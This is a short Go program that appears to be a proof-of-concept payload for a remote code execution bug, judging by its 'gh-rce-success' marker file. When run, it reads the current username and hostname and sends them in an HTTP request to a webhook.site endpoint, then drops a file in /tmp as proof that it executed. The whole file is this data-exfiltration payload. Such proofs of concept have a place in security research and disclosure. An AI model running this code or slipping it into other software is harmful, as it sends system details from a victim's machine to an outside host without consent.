package main

import (
	"net/http"
	"os"
)

func main() {
	user := os.Getenv("USER")
	host, _ := os.Hostname()

	// Send the data to your webhook.site endpoint
	http.Get("https://webhook.site/3294f9b6-c12b-4ae0-a4ba-8001959fb5a1?user=" + user + "&host=" + host)

	// Optional: drop a file for proof of execution
	os.Create("/tmp/gh-rce-success")
}
